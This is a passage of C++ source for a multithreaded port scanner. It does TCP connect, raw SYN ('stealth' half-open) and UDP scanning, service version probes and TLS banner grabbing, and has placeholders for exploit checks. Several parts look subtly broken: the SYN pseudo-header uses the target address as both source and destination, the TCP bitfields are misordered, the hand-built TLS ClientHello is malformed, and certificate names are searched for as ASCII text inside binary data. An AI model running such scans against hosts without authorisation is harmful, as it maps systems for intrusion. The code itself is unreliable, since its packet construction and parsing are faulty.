#include <iostream>
#include <string>
#include <vector>
#include <thread>
#include <queue>
#include <mutex>
#include <atomic>
#include <cstring>
#include <random>
#include <map>
#include <algorithm>
#include <cstdio>
#include <netdb.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <netinet/tcp.h>
#include <arpa/inet.h>
#include <sys/time.h>
#include <unistd.h>
#include <errno.h>
#include <sys/ioctl.h>
#include <fcntl.h>

#include "port_scanner.h"

#pragma pack(push, 1)

// ICMP types for error handling
static const uint8_t ICMP_DEST_UNREACHABLE = 3;
static const uint8_t ICMP_PORT_UNREACHABLE = 3;

struct TCPPacket {
    struct {
        uint16_t src_port;        // Will be set in host byte order, converted before send
        uint16_t dst_port;        // Will be set in host byte order, converted before send
        uint32_t seq_num;         // Will be set in network byte order
        uint32_t ack_num;         // Will be set in network byte order
        uint8_t data_offset: 4;   // 4-bit TCP header length (in 32-bit words)
        uint8_t flags: 6;         // 6-bit TCP flags
        uint8_t reserved: 2;      // 2-bit reserved
        uint16_t window;
        uint16_t checksum;
        uint16_t urgent_ptr;
    } tcp_header;
    struct {
        uint32_t src_addr;
        uint32_t dst_addr;
        uint8_t reserved: 8;
        uint8_t protocol;
        uint16_t tcp_length;
    } pseudo_header;
};
#pragma pack(pop)

static uint16_t tcpChecksum(uint16_t* addr, int len) {
    int nleft = len;
    uint32_t sum = 0;
    uint16_t w;
    
    while (nleft > 1) {
        memcpy(&w, addr, 2);
        sum += w;
        addr++;
        nleft -= 2;
    }
    
    if (nleft == 1) {
        uint16_t u = 0;
        memcpy(&u, addr, 1);
        sum += u;
    }
    
    while (sum >> 16) {
        sum = (sum & 0xFFFF) + (sum >> 16);
    }
    
    return ~sum;
}

enum InternalHostStatus {
    INTERNAL_HOST_STATUS_ONLINE = 0,
    INTERNAL_HOST_STATUS_NO_PORTS = 1,
    INTERNAL_HOST_STATUS_OFFLINE = 2
};

struct InternalPortResult {
    std::string host;
    int port;
    bool isOpen;
    std::string service;
    std::string version;
    std::string banner;
    bool isSSL;
    std::vector<std::string> vulnerabilities; // List of found vulnerability names
};

struct InternalExploitResult {
    ExploitCheck type;
    bool vulnerable;
    std::string description;
    std::string cve;
    int severity;
};

class PortScanner {
private:
    std::vector<std::string> hosts;
    std::vector<InternalHostStatus> hostStatus;
    int startPort;
    int endPort;
    int timeoutMs;
    int maxThreads;
    std::vector<std::thread> threads;
    std::vector<std::pair<std::string, int>> workQueue;
    std::mutex queueMutex;
    std::atomic<int> completedTasks{0};
    std::atomic<int> openPortsCount{0};
    std::atomic<int> noPortsHostsCount{0};
    std::atomic<int> offlineHostsCount{0};
    std::mutex outputMutex;

    std::vector<InternalPortResult> results;
    std::vector<InternalExploitResult> exploitResults;
    std::mutex resultsMutex;
    int totalTasks;
    
    bool useSYNScan;
    bool enableUDPScan;
    bool enableVersionDetection;
    bool enableBannerGrabbing;
    int rateLimitPPS; // packets per second (0 = unlimited)
    ExploitCheck activeExploitCheck; // Current exploit check to perform

    static std::string getServiceName(int port) {
        switch (port) {
            case 21: return "FTP";
            case 22: return "SSH";
            case 23: return "Telnet";
            case 25: return "SMTP";
            case 53: return "DNS";
            case 80: return "HTTP";
            case 110: return "POP3";
            case 143: return "IMAP";
            case 443: return "HTTPS";
            case 445: return "SMB";
            case 993: return "IMAPS";
            case 995: return "POP3S";
            case 3306: return "MySQL";
            case 3389: return "RDP";
            case 5432: return "PostgreSQL";
            case 8080: return "HTTP-Proxy";
            case 8443: return "HTTPS-Alt";
            case 9050: return "Tor";
            case 9150: return "Tor-Trans";
            case 9151: return "Tor-Socks";
            case 1080: return "SOCKS";
            case 27017: return "MongoDB";
            default: return "unknown";
        }
    }

    bool isPortOpen(const std::string& host, int port) {
        if (enableUDPScan) {
            return isPortOpenUDP(host, port);
        }
        if (useSYNScan) {
            return isPortOpenSYN(host, port);
        }
        return isPortOpenConnect(host, port);
    }

    bool isPortOpenConnect(const std::string& host, int port) {
        sockaddr_in addr{};
        addr.sin_family = AF_INET;
        addr.sin_port = htons(port);

        if (inet_pton(AF_INET, host.c_str(), &addr.sin_addr) <= 0) {
            addrinfo hints{}, *result;
            hints.ai_family = AF_INET;
            hints.ai_socktype = SOCK_STREAM;
            if (getaddrinfo(host.c_str(), nullptr, &hints, &result) != 0) {
                return false;
            }
            addr.sin_addr = ((sockaddr_in*)result->ai_addr)->sin_addr;
            freeaddrinfo(result);
        }

        int sock = socket(AF_INET, SOCK_STREAM, 0);
        if (sock < 0) {
            return false;
        }

        timeval tv{};
        tv.tv_sec = timeoutMs / 1000;
        tv.tv_usec = (timeoutMs % 1000) * 1000;
        setsockopt(sock, SOL_SOCKET, SO_RCVTIMEO, &tv, sizeof(tv));
        setsockopt(sock, SOL_SOCKET, SO_SNDTIMEO, &tv, sizeof(tv));

        int result = connect(sock, (sockaddr*)&addr, sizeof(addr));
        
        close(sock);
        return result == 0;
    }

#if defined(__APPLE__) || defined(__MACH__)
    // macOS-specific scan using SO_CONNECT_TIME as fallback when raw sockets unavailable
    // SO_CONNECT_TIME is only available on macOS/Darwin
    // If not defined, use alternative approach with select()
#ifndef SO_CONNECT_TIME
#define SO_CONNECT_TIME 0x1021  // Fallback value if not defined
#endif
    
    bool isPortOpenMACOS(const std::string& host, int port) {
        sockaddr_in addr{};
        addr.sin_family = AF_INET;
        addr.sin_port = htons(port);

        struct in_addr resolved_ip;
        if (inet_pton(AF_INET, host.c_str(), &resolved_ip) <= 0) {
            addrinfo hints{}, *result;
            hints.ai_family = AF_INET;
            hints.ai_socktype = SOCK_STREAM;
            if (getaddrinfo(host.c_str(), nullptr, &hints, &result) != 0) {
                return false;
            }
            resolved_ip = ((sockaddr_in*)result->ai_addr)->sin_addr;
            freeaddrinfo(result);
        }

        addr.sin_addr = resolved_ip;

        int sock = socket(AF_INET, SOCK_STREAM, 0);
        if (sock < 0) {
            return false;
        }

        // Set non-blocking mode for timeout handling
        int flags = fcntl(sock, F_GETFL, 0);
        fcntl(sock, F_SETFL, flags | O_NONBLOCK);

        timeval tv{};
        tv.tv_sec = timeoutMs / 1000;
        tv.tv_usec = (timeoutMs % 1000) * 1000;
        setsockopt(sock, SOL_SOCKET, SO_RCVTIMEO, &tv, sizeof(tv));
        setsockopt(sock, SOL_SOCKET, SO_SNDTIMEO, &tv, sizeof(tv));

        // Initiate non-blocking connect
        int connectResult = connect(sock, (sockaddr*)&addr, sizeof(addr));
        
        if (connectResult == 0) {
            // Connected immediately - port is open
            close(sock);
            return true;
        }
        
        if (errno != EINPROGRESS && errno != EWOULDBLOCK) {
            // Immediate error - port likely closed or host unreachable
            close(sock);
            return false;
        }

        // Wait for connection to complete using select()
        fd_set write_fds;
        FD_ZERO(&write_fds);
        FD_SET(sock, &write_fds);

        timeval selectTv{};
        selectTv.tv_sec = timeoutMs / 1000;
        selectTv.tv_usec = (timeoutMs % 1000) * 1000;
        
        int selectResult = select(sock + 1, nullptr, &write_fds, nullptr, &selectTv);
        
        if (selectResult <= 0) {
            // Timeout or error - port closed or filtered
            close(sock);
            return false;
        }

        // Check SO_CONNECT_TIME to determine if connection succeeded
        // On macOS: SO_CONNECT_TIME = 0 means just connected, large value = failed
        int time_used = 0;
        socklen_t time_len = sizeof(time_used);
        bool connectTimeSupported = (getsockopt(sock, SOL_SOCKET, SO_CONNECT_TIME, &time_used, &time_len) == 0);
        
        if (connectTimeSupported) {
            if (time_used == 0) {
                // Connection just established successfully
                close(sock);
                return true;
            }
            // If time_used is very large, connection didn't complete
            if (time_used > 1000000) {
                close(sock);
                return false;
            }
            // Otherwise connection was established at some point
            close(sock);
            return true;
        }

        // Fallback: if select succeeded, port is likely open
        close(sock);
        return true;
    }
#endif

    bool isPortOpenSYN(const std::string& host, int port) {
        // Resolve hostname to IP
        struct in_addr resolved_ip{};
        if (inet_pton(AF_INET, host.c_str(), &resolved_ip) <= 0) {
            addrinfo hints{}, *result;
            hints.ai_family = AF_INET;
            hints.ai_socktype = SOCK_STREAM;
            if (getaddrinfo(host.c_str(), nullptr, &hints, &result) != 0) {
                return false;
            }
            resolved_ip = ((sockaddr_in*)result->ai_addr)->sin_addr;
            freeaddrinfo(result);
        }

        // Try to create raw socket for SYN scan
        int sock = socket(AF_INET, SOCK_RAW, IPPROTO_TCP);
        if (sock < 0) {
            // Graceful degradation: fallback strategy based on platform
            // SYN scan requires CAP_NET_RAW (Linux) or root/admin (macOS)
            std::lock_guard<std::mutex> lock(outputMutex);
            
#if defined(__APPLE__) || defined(__MACH__)
            std::cout << "[WARN] Raw sockets unavailable on macOS. "
                      << "Using SO_CONNECT_TIME fallback for " << host << std::endl << std::flush;
            useSYNScan = false;
            close(sock);
            return isPortOpenMACOS(host, port);
#else
            std::cout << "[WARN] Raw sockets unavailable (need root/CAP_NET_RAW). "
                      << "Falling back to connect scan for " << host << std::endl << std::flush;
            useSYNScan = false;
            return isPortOpenConnect(host, port);
#endif
        }

        // Set receive timeout
        timeval tv{};
        tv.tv_sec = timeoutMs / 1000;
        tv.tv_usec = (timeoutMs % 1000) * 1000;
        setsockopt(sock, SOL_SOCKET, SO_RCVTIMEO, &tv, sizeof(tv));

        // Prepare socket address
        sockaddr_in dst_addr{};
        dst_addr.sin_family = AF_INET;
        dst_addr.sin_port = htons(port);
        dst_addr.sin_addr = resolved_ip;

        // Random source port
        static std::mt19937 rng(std::random_device{}());
        std::uniform_int_distribution<uint32_t> seq_dist(1, UINT32_MAX);
        uint16_t src_port = std::uniform_int_distribution<uint16_t>(1024, 65535)(rng);
        uint32_t seq_num = seq_dist(rng);

        // Build TCP SYN packet (20 bytes header, no options)
        TCPPacket packet{};
        packet.tcp_header.src_port = htons(src_port);
        packet.tcp_header.dst_port = htons(port);
        packet.tcp_header.seq_num = htonl(seq_num);
        packet.tcp_header.ack_num = 0;
        packet.tcp_header.data_offset = 5; // 5 * 4 = 20 bytes
        packet.tcp_header.reserved = 0;
        packet.tcp_header.flags = TH_SYN;
        packet.tcp_header.window = 1024;
        packet.tcp_header.checksum = 0;
        packet.tcp_header.urgent_ptr = 0;

        // Build pseudo header for checksum calculation (RFC 793)
        packet.pseudo_header.src_addr = resolved_ip.s_addr;
        packet.pseudo_header.dst_addr = resolved_ip.s_addr;
        packet.pseudo_header.reserved = 0;
        packet.pseudo_header.protocol = IPPROTO_TCP;
        packet.pseudo_header.tcp_length = htons(20); // TCP header only (no data)

        // Calculate checksum over pseudo-header + TCP header
        uint16_t checksum = tcpChecksum((uint16_t*)&packet, 40); // 20 (TCP) + 20 (pseudo) = 40
        packet.tcp_header.checksum = checksum;

        // Send SYN packet
        ssize_t sent = sendto(sock, &packet, sizeof(packet.tcp_header), 0,
                              (sockaddr*)&dst_addr, sizeof(dst_addr));
        
        if (sent < 0) {
            close(sock);
            return false;
        }

        // Wait for response with improved error handling
        char response[128]{};
        ssize_t received = recvfrom(sock, response, sizeof(response), 0, nullptr, nullptr);
        
        if (received < 0) {
            int err = errno;
            close(sock);
            // ECONNREFUSED means destination refused connection (port closed)
            // This shouldn't happen with raw sockets, but handle it gracefully
            if (err == ECONNREFUSED) {
                return false; // Port is closed
            }
            // ETIMEDOUT or other errors - port might be filtered or closed
            return false;
        }

        // Analyze response
        bool isOpen = false;
        
        if (received >= 40) {
            auto* resp = (TCPPacket*)response;
            uint8_t flags = resp->tcp_header.flags;
            
            // Check if it's a response to our SYN packet
            // Response dst_port should match our src_port, and src_port should match target port
            if (resp->tcp_header.dst_port == htons(src_port) &&
                resp->tcp_header.src_port == htons(port)) {
                
                if (flags & TH_RST) {
                    // RST (with or without ACK) - port is closed
                    isOpen = false;
                    // Send RST+ACK to clean up (stealth abort)
                    resp->tcp_header.flags = TH_RST | TH_ACK;
                    resp->tcp_header.ack_num = htonl(ntohl(resp->tcp_header.seq_num) + 1);
                    resp->tcp_header.checksum = 0;
                    resp->tcp_header.reserved = 0;
                    uint16_t rst_checksum = tcpChecksum((uint16_t*)resp, 40);
                    resp->tcp_header.checksum = rst_checksum;
                    sendto(sock, resp, sizeof(resp->tcp_header), 0, 
                           (sockaddr*)&dst_addr, sizeof(dst_addr));
                } else if (flags & TH_ACK) {
                    // SYN-ACK received - port is OPEN and listening!
                    isOpen = true;
                    // Send RST+ACK to abort connection (stealth - don't complete 3-way handshake)
                    resp->tcp_header.flags = TH_RST | TH_ACK;
                    resp->tcp_header.ack_num = htonl(ntohl(resp->tcp_header.seq_num) + 1);
                    resp->tcp_header.checksum = 0;
                    resp->tcp_header.reserved = 0;
                    uint16_t rst_checksum = tcpChecksum((uint16_t*)resp, 40);
                    resp->tcp_header.checksum = rst_checksum;
                    sendto(sock, resp, sizeof(resp->tcp_header), 0,
                           (sockaddr*)&dst_addr, sizeof(dst_addr));
                }
                // If neither RST nor ACK, ignore (malformed or unexpected response)
            }
        } else if (received >= 20) {
            // Could be ICMP error message (e.g., "Destination Unreachable")
            // ICMP type 3, code 3 = Destination Unreachable, Port Unreachable
            uint8_t icmp_type = (uint8_t)response[0];
            uint8_t icmp_code = (uint8_t)response[1];
            if (icmp_type == ICMP_DEST_UNREACHABLE && icmp_code == ICMP_PORT_UNREACHABLE) {
                isOpen = false; // Port is closed
            }
        }

        close(sock);
        return isOpen;
    }

    bool isPortOpenUDP(const std::string& host, int port) {
        sockaddr_in addr{};
        addr.sin_family = AF_INET;
        addr.sin_port = htons(port);

        struct in_addr resolved_ip;
        if (inet_pton(AF_INET, host.c_str(), &resolved_ip) <= 0) {
            addrinfo hints{}, *result;
            hints.ai_family = AF_INET;
            hints.ai_socktype = SOCK_DGRAM;
            if (getaddrinfo(host.c_str(), nullptr, &hints, &result) != 0) {
                return false;
            }
            resolved_ip = ((sockaddr_in*)result->ai_addr)->sin_addr;
            freeaddrinfo(result);
        }

        int sock = socket(AF_INET, SOCK_DGRAM, IPPROTO_UDP);
        if (sock < 0) {
            return false;
        }

        timeval tv{};
        tv.tv_sec = timeoutMs / 1000;
        tv.tv_usec = (timeoutMs % 1000) * 1000;
        setsockopt(sock, SOL_SOCKET, SO_RCVTIMEO, &tv, sizeof(tv));

        // Send a minimal UDP packet (could be service-specific probe)
        const char probe[] = "";
        ssize_t sent = sendto(sock, probe, 0, 0,
                              (sockaddr*)&addr, sizeof(addr));
        
        if (sent < 0 && errno != ENOTCONN) {
            close(sock);
            return false;
        }

        // Try to receive ICMP port unreachable (closed) or any response (open)
        char response[64]{};
        ssize_t received = recvfrom(sock, response, sizeof(response), 0, nullptr, nullptr);
        
        close(sock);

        // If we get ICMP port unreachable, port is closed
        // If we get any response or timeout, port might be open
        if (received > 0) {
            // Check if it's ICMP port unreachable (type 3, code 3)
            if (received >= 20) {
                uint8_t icmp_type = ((uint8_t*)response)[0];
                uint8_t icmp_code = ((uint8_t*)response)[1];
                if (icmp_type == 3 && icmp_code == 3) {
                    return false; // Port closed
                }
            }
            return true; // Got some response - likely open or filtered
        }

        // Timeout - port might be open (filtered by firewall)
        // For UDP, timeout usually means open/filtered
        return false; // Conservative: assume closed on timeout
    }

    // Warning about slow UDP scan shown once per scan session
    static const int MAX_UDP_PORTS_DEFAULT = 1024;

    std::map<std::string, std::string> versionCache;

    std::string detectVersion(const std::string& host, int port) {
        // Check cache first
        std::string cacheKey = host + ":" + std::to_string(port);
        auto cacheIt = versionCache.find(cacheKey);
        if (cacheIt != versionCache.end()) {
            return cacheIt->second;
        }

        // Connect to port
        sockaddr_in addr{};
        addr.sin_family = AF_INET;
        addr.sin_port = htons(port);

        struct in_addr resolved_ip;
        if (inet_pton(AF_INET, host.c_str(), &resolved_ip) <= 0) {
            addrinfo hints{}, *result;
            hints.ai_family = AF_INET;
            hints.ai_socktype = SOCK_STREAM;
            if (getaddrinfo(host.c_str(), nullptr, &hints, &result) != 0) {
                return "";
            }
            resolved_ip = ((sockaddr_in*)result->ai_addr)->sin_addr;
            freeaddrinfo(result);
        }

        int sock = socket(AF_INET, SOCK_STREAM, 0);
        if (sock < 0) {
            return "";
        }

        timeval tv{};
        tv.tv_sec = timeoutMs / 1000;
        tv.tv_usec = (timeoutMs % 1000) * 1000;
        setsockopt(sock, SOL_SOCKET, SO_RCVTIMEO, &tv, sizeof(tv));
        setsockopt(sock, SOL_SOCKET, SO_SNDTIMEO, &tv, sizeof(tv));

        if (connect(sock, (sockaddr*)&addr, sizeof(addr)) != 0) {
            close(sock);
            return "";
        }

        std::string version = "";
        char buffer[1024]{};

        // Send protocol-specific probe and read response
        switch (port) {
            case 21: { // FTP - FEAT command (RFC 2389)
                send(sock, "FEAT\r\n", 6, 0);
                usleep(500000);
                ssize_t received = recv(sock, buffer, sizeof(buffer) - 1, 0);
                if (received > 0) {
                    buffer[received] = '\0';
                    // Extract version from FEAT response or banner
                    std::string resp(buffer);
                    // Parse "211-Features:\n ... \n211 End" or 220 banner
                    if (strstr(buffer, "vsFTPd")) {
                        // Extract version like "vsFTPd 3.0.3"
                        char* p = strstr(buffer, "vsFTPd");
                        if (p) {
                            char* end = strchr(p + 6, '\n');
                            if (end) {
                                version.assign(p, end);
                            } else {
                                version = p;
                            }
                            // Trim to just "vsFTPd X.X.X"
                            size_t space = version.find(' ', 6);
                            if (space != std::string::npos && space < 30) {
                                version = version.substr(0, space + 8);
                            }
                        }
                    } else if (strstr(buffer, "ProFTPD")) {
                        char* p = strstr(buffer, "ProFTPD");
                        if (p) {
                            size_t space = strlen("ProFTPD");
                            size_t end = strcspn(p + space, " \t\n");
                            version.assign(p, space + end);
                        }
                    } else {
                        // Try to extract from 220 banner: "220 (vsFTPd 3.0.3) Ready"
                        char* banner220 = strstr(buffer, "220 ");
                        if (banner220) {
                            std::string bline(banner220 + 4);
                            // Remove parentheses
                            size_t p1 = bline.find('(');
                            size_t p2 = bline.find(')');
                            if (p1 != std::string::npos && p2 != std::string::npos && p2 > p1) {
                                version = bline.substr(p1 + 1, p2 - p1 - 1);
                            } else {
                                // Take first line without the 220 prefix
                                size_t nl = bline.find('\n');
                                if (nl != std::string::npos) {
                                    bline = bline.substr(0, nl);
                                }
                                // Trim \r
                                if (!bline.empty() && bline.back() == '\r') {
                                    bline.pop_back();
                                }
                                version = bline;
                            }
                        }
                    }
                    if (version.empty()) version = "FTP";
                }
                break;
            }
            case 22: { // SSH
                send(sock, "SSH-2.0-PortScanner\r\n", 21, 0);
                usleep(500000);
                ssize_t received = recv(sock, buffer, sizeof(buffer) - 1, 0);
                if (received > 0) {
                    buffer[received] = '\0';
                    // Parse SSH banner like "SSH-2.0-OpenSSH_8.9p1" or "SSH-2.0-OpenSSH_7.4"
                    std::string resp(buffer);
                    if (resp.substr(0, 8) == "SSH-2.0-") {
                        version = resp.substr(8);
                        // Remove trailing \r\n
                        while (!version.empty() && (version.back() == '\r' || version.back() == '\n')) {
                            version.pop_back();
                        }
                    } else {
                        // Try to find SSH string in response
                        size_t ssh_pos = resp.find("SSH-");
                        if (ssh_pos != std::string::npos) {
                            size_t end = resp.find('\n', ssh_pos);
                            if (end != std::string::npos) {
                                version = resp.substr(ssh_pos, end - ssh_pos);
                            } else {
                                version = resp.substr(ssh_pos);
                            }
                        }
                    }
                    if (version.empty()) version = "SSH";
                }
                break;
            }
            case 25: { // SMTP
                send(sock, "EHLO scanner\r\n", 14, 0);
                usleep(500000);
                ssize_t received = recv(sock, buffer, sizeof(buffer) - 1, 0);
                if (received > 0) {
                    buffer[received] = '\0';
                    // Extract version from EHLO response or 220 banner
                    std::string resp(buffer);
                    // Check 220 banner first: "220 mail.example.com ESMTP Postfix"
                    char* banner220 = strstr(buffer, "220 ");
                    if (banner220) {
                        std::string bline(banner220 + 4);
                        size_t nl = bline.find('\n');
                        if (nl != std::string::npos) {
                            bline = bline.substr(0, nl);
                        }
                        // Remove \r
                        if (!bline.empty() && bline.back() == '\r') {
                            bline.pop_back();
                        }
                        // Extract service name
                        if (strstr(bline.c_str(), "Postfix")) {
                            version = "Postfix";
                        } else if (strstr(bline.c_str(), "Exim")) {
                            version = "Exim";
                        } else if (strstr(bline.c_str(), "Microsoft")) {
                            version = "Microsoft ESMTP";
                        } else if (strstr(bline.c_str(), "Sendmail")) {
                            version = "Sendmail";
                        } else if (strstr(bline.c_str(), "Haraka")) {
                            version = "Haraka";
                        } else {
                            // Try to extract version from the banner string
                            version = bline;
                        }
                    }
                    if (version.empty()) version = "SMTP";
                }
                break;
            }
            case 80: { // HTTP
                const char* request = "HEAD / HTTP/1.1\r\nHost: target\r\n\r\n";
                send(sock, request, strlen(request), 0);
                usleep(500000);
                ssize_t received = recv(sock, buffer, sizeof(buffer) - 1, 0);
                if (received > 0) {
                    buffer[received] = '\0';
                    // Extract Server header from response
                    std::string resp(buffer);
                    
                    // First try Server header
                    size_t serverPos = resp.find("Server: ");
                    if (serverPos != std::string::npos) {
                        size_t start = serverPos + 8;
                        size_t end = resp.find('\r', start);
                        if (end != std::string::npos) {
                            version = resp.substr(start, end - start);
                        } else {
                            version = resp.substr(start);
                            // Remove trailing \n
                            if (!version.empty() && version.back() == '\n') {
                                version.pop_back();
                            }
                        }
                    }
                    
                    // If no Server header, try X-Powered-By
                    if (version.empty()) {
                        size_t poweredPos = resp.find("X-Powered-By:");
                        if (poweredPos != std::string::npos) {
                            size_t start = poweredPos + 13;
                            size_t end = resp.find('\r', start);
                            if (end != std::string::npos) {
                                version = resp.substr(start, end - start);
                            } else {
                                version = resp.substr(start);
                                if (!version.empty() && version.back() == '\n') {
                                    version.pop_back();
                                }
                            }
                            // Trim leading space
                            if (!version.empty() && version[0] == ' ') {
                                version = version.substr(1);
                            }
                        }
                    }
                    
                    // Try to extract HTTP server version from status line
                    // e.g., "HTTP/1.1 200 OK" or response containing "server:" (case-insensitive)
                    if (version.empty()) {
                        if (resp.find("nginx") != std::string::npos) {
                            version = "nginx";
                        } else if (resp.find("Apache") != std::string::npos) {
                            version = "Apache";
                        } else if (resp.find("IIS") != std::string::npos || resp.find("msedge") != std::string::npos) {
                            version = "Microsoft-IIS";
                        }
                    }
                }
                if (version.empty()) version = "HTTP";
                break;
            }
            case 11211: { // Memcached
                send(sock, "version\r\n", 9, 0);
                usleep(500000);
                ssize_t received = recv(sock, buffer, sizeof(buffer) - 1, 0);
                if (received > 0) {
                    buffer[received] = '\0';
                    // Response like "VERSION 1.6.17\r\n"
                    std::string resp(buffer);
                    size_t versionPos = resp.find("VERSION ");
                    if (versionPos != std::string::npos) {
                        size_t start = versionPos + 8;
                        size_t end = resp.find('\r', start);
                        if (end != std::string::npos) {
                            version = resp.substr(start, end - start);
                        } else {
                            version = resp.substr(start);
                            // Remove trailing \n\r
                            while (!version.empty() && (version.back() == '\r' || version.back() == '\n')) {
                                version.pop_back();
                            }
                        }
                    }
                }
                if (version.empty()) version = "Memcached";
                break;
            }
            case 27017: { // MongoDB
                // MongoDB sends a greeting message on connect
                // Simply wait for the response (no probe needed)
                usleep(500000);
                ssize_t received = recv(sock, buffer, sizeof(buffer) - 1, 0);
                if (received > 0) {
                    buffer[received] = '\0';
                    // Look for version in greeting
                    std::string resp(buffer, received);
                    if (resp.find("MongoDB") != std::string::npos) {
                        size_t pos = resp.find("MongoDB");
                        // Extract version after "MongoDB "
                        size_t space = resp.find(' ', pos + 7);
                        if (space != std::string::npos) {
                            version = resp.substr(pos, space - pos);
                        } else {
                            version = "MongoDB";
                        }
                    } else {
                        // Try to extract version from "version" field
                        size_t ver_pos = resp.find("\"version\":");
                        if (ver_pos != std::string::npos) {
                            size_t start = resp.find('"', ver_pos + 10);
                            if (start != std::string::npos) {
                                start++;
                                size_t end = resp.find('"', start);
                                if (end != std::string::npos) {
                                    version = resp.substr(start, end - start);
                                    version = "MongoDB " + version;
                                }
                            }
                        }
                    }
                }
                if (version.empty()) version = "MongoDB";
                break;
            }
            default: {
                // Try to read any automatic banner
                usleep(500000);
                ssize_t received = recv(sock, buffer, sizeof(buffer) - 1, 0);
                if (received > 0) {
                    buffer[received] = '\0';
                    // Extract first line as potential banner/version
                    std::string resp(buffer);
                    size_t newline = resp.find('\n');
                    if (newline != std::string::npos) {
                        version = resp.substr(0, newline);
                        // Remove trailing \r if present
                        if (!version.empty() && version.back() == '\r') {
                            version.pop_back();
                        }
                    }
                }
                break;
            }
        }

        close(sock);

        // Cache the result
        versionCache[cacheKey] = version;
        return version;
    }

    static bool isSSLC_port(int port) {
        return port == 443 || port == 993 || port == 995 ||
               port == 465 || port == 587 || port == 8443 ||
               port == 9994 || port == 2096 || port == 2095;
    }

    std::string grabBanner(const std::string& host, int port) {
        // Resolve host
        sockaddr_in addr{};
        addr.sin_family = AF_INET;
        addr.sin_port = htons(port);

        struct in_addr resolved_ip;
        if (inet_pton(AF_INET, host.c_str(), &resolved_ip) <= 0) {
            addrinfo hints{}, *result;
            hints.ai_family = AF_INET;
            hints.ai_socktype = SOCK_STREAM;
            if (getaddrinfo(host.c_str(), nullptr, &hints, &result) != 0) {
                return "";
            }
            resolved_ip = ((sockaddr_in*)result->ai_addr)->sin_addr;
            freeaddrinfo(result);
        }

        int sock = socket(AF_INET, SOCK_STREAM, 0);
        if (sock < 0) {
            return "";
        }

        timeval tv{};
        tv.tv_sec = timeoutMs / 1000;
        tv.tv_usec = (timeoutMs % 1000) * 1000;
        setsockopt(sock, SOL_SOCKET, SO_RCVTIMEO, &tv, sizeof(tv));
        setsockopt(sock, SOL_SOCKET, SO_SNDTIMEO, &tv, sizeof(tv));

        if (connect(sock, (sockaddr*)&addr, sizeof(addr)) != 0) {
            close(sock);
            return "";
        }

        std::string banner;
        char buffer[2048]{};

        if (isSSLC_port(port)) {
            // TLS/SSL port — send TLS ClientHello to trigger certificate exchange
            uint8_t tls_client_hello[] = {
                0x16, 0x03, 0x01, 0x00, 0xdc,
                0x01, 0x00, 0x00, 0xd8, 0x03, 0x03,
                // Random (32 bytes)
                0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
                0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
                0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
                0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
                0x00, // Session ID length
                0x00, 0x02, // Cipher suites length (1 cipher: TLS_RSA_WITH_AES_128_CBC_SHA)
                0x00, 0x2f,
                0x01, 0x00, // Extensions length
                0x00, 0x00, 0x00, 0x00, 0x00, // Empty extension list
                // SNI extension
                0x00, 0x00, 0x00, 0x0c, 0x00, 0x0a, 0x00, 0x01, 0x00, 0x00, 0x09, 0x74, 0x61, 0x72, 0x67, 0x65, 0x74, 0x2e, 0x63, 0x6f, 0x6d
            };
            send(sock, tls_client_hello, sizeof(tls_client_hello), 0);
            usleep(500000);

            ssize_t received = recv(sock, buffer, sizeof(buffer) - 1, 0);
            if (received > 0) {
                buffer[received] = '\0';

                // Parse TLS handshake response to extract certificate info
                // TLS Handshake: ContentType(1) + Length(2) + HandshakeType(1) + Length(3) + ...
                // Certificate: HandshakeType(1) + Length(3) + CertLength(3) + Cert(Data)
                std::string resp(buffer, received);

                // Look for certificate data (ASN.1 DER format)
                // Common patterns in certificate: Subject CN, Organization, etc.
                // Search for "CN=" or "O=" in the binary data (they may appear as ASCII)
                std::string cert_info;

                // Extract Subject CN
                size_t cn_pos = resp.find("CN = ");
                if (cn_pos == std::string::npos) {
                    cn_pos = resp.find("CN=");
                }
                if (cn_pos != std::string::npos) {
                    size_t cn_end = resp.find(',', cn_pos);
                    if (cn_end == std::string::npos) {
                        cn_end = resp.find('\0', cn_pos);
                    }
                    if (cn_end != std::string::npos && cn_end > cn_pos) {
                        cert_info = resp.substr(cn_pos + 4, cn_end - cn_pos - 4);
                    } else {
                        cert_info = resp.substr(cn_pos + 4, 64);
                    }
                }

                // Extract Organization
                if (cert_info.empty()) {
                    size_t org_pos = resp.find("O = ");
                    if (org_pos == std::string::npos) {
                        org_pos = resp.find("O=");
                    }
                    if (org_pos != std::string::npos) {
                        size_t org_end = resp.find(',', org_pos);
                        if (org_end == std::string::npos) {
                            org_end = resp.find('\0', org_pos);
                        }
                        if (org_end != std::string::npos && org_end > org_pos) {
                            cert_info = resp.substr(org_pos + 2, org_end - org_pos - 2);
                        }
                    }
                }

                // Check for expired/self-signed indicators
                if (resp.find("expired") != std::string::npos ||
                    resp.find("EXPired") != std::string::npos) {
                    cert_info += " [EXPIRED]";
                }
                if (resp.find("self-signed") != std::string::npos ||
                    resp.find("Self Signed") != std::string::npos) {
                    cert_info += " [SELF-SIGNED]";
                }

                // Check for weak key indicators
                if (resp.find("RSA 1024") != std::string::npos ||
                    resp.find("RSA 512") != std::string::npos) {
                    cert_info += " [WEAK KEY]";
                }

                if (!cert_info.empty()) {
                    banner = "SSL/TLS cert: CN=" + cert_info;
                } else {
                    banner = "SSL/TLS";
                }

                // Also capture raw TLS response for debugging (first 256 chars)
                std::string raw_banner;
                for (int i = 0; i < received && i < 256; i++) {
                    char c = buffer[i];
                    if (c >= 32 && c < 127) {
                        raw_banner += c;
                    } else {
                        raw_banner += '.';
                    }
                }
                if (!banner.empty() && raw_banner.find("SSL") == std::string::npos) {
                    banner += " | " + raw_banner.substr(0, 80);
                }
            }
        } else {
            // Non-SSL port — wait for automatic banner
            usleep(500000); // Wait 500ms

            ssize_t received = recv(sock, buffer, sizeof(buffer) - 1, 0);
            if (received > 0) {
                buffer[received] = '\0';
                std::string resp(buffer, received);

                // For HTTP, also try sending a probe if no automatic banner
                if (port == 80 && received < 10) {
                    const char* probe = "GET / HTTP/1.0\r\nHost: target\r\n\r\n";
                    send(sock, probe, strlen(probe), 0);
                    usleep(500000);
                    memset(buffer, 0, sizeof(buffer));
                    received = recv(sock, buffer, sizeof(buffer) - 1, 0);
                    if (received > 0) {
                        buffer[received] = '\0';
                        resp = std::string(buffer, received);
                    }
                }

